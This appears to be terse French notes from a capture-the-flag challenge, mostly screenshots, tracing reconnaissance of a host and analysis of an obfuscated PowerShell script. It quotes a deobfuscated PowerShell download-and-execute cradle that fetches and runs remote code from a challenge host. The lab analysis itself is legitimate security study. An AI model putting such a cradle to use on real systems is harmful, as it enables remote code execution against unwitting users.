![alt text](img/Pasted_image_20250322110828.png)

Ajout dans le /etc/hosts : 
![alt text](img/Pasted_image_20250322112119.png)

Lets WEB : 
`unable to connect...

![alt text](img/Pasted_image_20250322112218.png)


Hum : `NMAP`
![alt text](img/Pasted_image_20250322111136.png)

![alt text](img/Pasted_image_20250322112050.png)

*Werkzeug* *httpd 3.1.3* > Vulnérable si jamais 

Comprends pas trop là ....

On a un fichier **.ps1** 

![alt text](img/Pasted_image_20250322113515.png)

La commande obfusqué est : 
![alt text](img/Pasted_image_20250322113528.png)

`IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")`

Invoke-Expression > 
![alt text](img/Pasted_image_20250322113706.png)
hum >> 
![alt text](img/Pasted_image_20250322113854.png)

![alt text](img/Pasted_image_20250322113922.png)

On va transformer la commande Powershell avec un **wget**
![alt text](img/Pasted_image_20250322114452.png)

![alt text](img/Pasted_image_20250322114511.png)




